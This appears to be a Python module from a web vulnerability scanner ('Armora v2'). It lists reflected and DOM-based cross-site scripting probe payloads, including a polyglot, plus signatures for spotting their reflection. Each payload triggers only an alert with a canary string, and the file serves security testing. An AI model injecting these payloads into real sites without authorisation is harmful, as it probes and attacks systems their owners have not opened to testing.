"""
XSS (Cross-Site Scripting) Payloads — Armora v2.

Reflected and DOM-based XSS payloads including polyglot variants.
"""

# Unique canary used to detect reflection without causing harm.
XSS_CANARY = "armora7x3k"

XSS_PAYLOADS = [
    f"<script>alert('{XSS_CANARY}')</script>",
    f"<img src=x onerror=alert('{XSS_CANARY}')>",
    f"<svg onload=alert('{XSS_CANARY}')>",
    f"<body onload=alert('{XSS_CANARY}')>",
    f"\"><script>alert('{XSS_CANARY}')</script>",
    f"'><script>alert('{XSS_CANARY}')</script>",
    f"<iframe src=\"javascript:alert('{XSS_CANARY}')\">",
    f"<details open ontoggle=alert('{XSS_CANARY}')>",
    f"javascript:alert('{XSS_CANARY}')",
    f"'-alert('{XSS_CANARY}')-'",
    f"\"-alert('{XSS_CANARY}')-\"",
    # Polyglot
    f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('{XSS_CANARY}') )//",
    # Event handler variants
    f"<input onfocus=alert('{XSS_CANARY}') autofocus>",
    f"<marquee onstart=alert('{XSS_CANARY}')>",
    f"<video><source onerror=alert('{XSS_CANARY}')>",
]

# Signatures that confirm XSS is reflected (look for these in response body)
XSS_CONFIRMATION_SIGNATURES = [
    f"alert('{XSS_CANARY}')",
    f"onerror=alert('{XSS_CANARY}')",
    f"onload=alert('{XSS_CANARY}')",
    f"ontoggle=alert('{XSS_CANARY}')",
    f"onfocus=alert('{XSS_CANARY}')",
    XSS_CANARY,  # Raw canary reflection
]
